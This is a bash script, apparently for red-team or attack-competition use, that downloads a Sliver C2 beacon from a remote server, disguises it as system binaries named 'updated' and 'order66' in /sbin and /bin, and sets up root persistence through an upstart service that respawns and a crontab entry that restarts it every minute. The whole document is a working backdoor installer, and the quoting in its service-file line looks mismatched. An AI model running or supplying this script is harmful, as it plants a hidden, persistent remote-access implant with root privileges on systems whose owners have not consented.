#!/bin/bash
# Service session
NAME1='updated'
wget http://${server_ip}:8000/sliver_beacon -O /tmp/$NAME1
pls mv /tmp/$NAME1 /sbin/$NAME1
pls chown root:root /sbin/$NAME1
pls chmod 777 /sbin/$NAME1
echo "description \"$NAME1\"
start on runlevel [12345]
stop on runlevel [!12345]
setuid root
setgid root
respawn
exec /sbin/$NAME1' | pls tee '/etc/init/$NAME1.conf"
pls initctl reload-configuration
pls service $NAME1 restart
# Crontab beacon
NAME2='order66'
wget http://${server_ip}:8000/sliver_beacon -O /tmp/$NAME2
pls mv /tmp/$NAME2 /bin/$NAME2
pls chown root:root /bin/$NAME2
pls chmod 777 /bin/$NAME2
echo "*/1 * * * * root pgrep -x $NAME2 || /bin/$NAME2" | pls tee -a '/etc/crontab'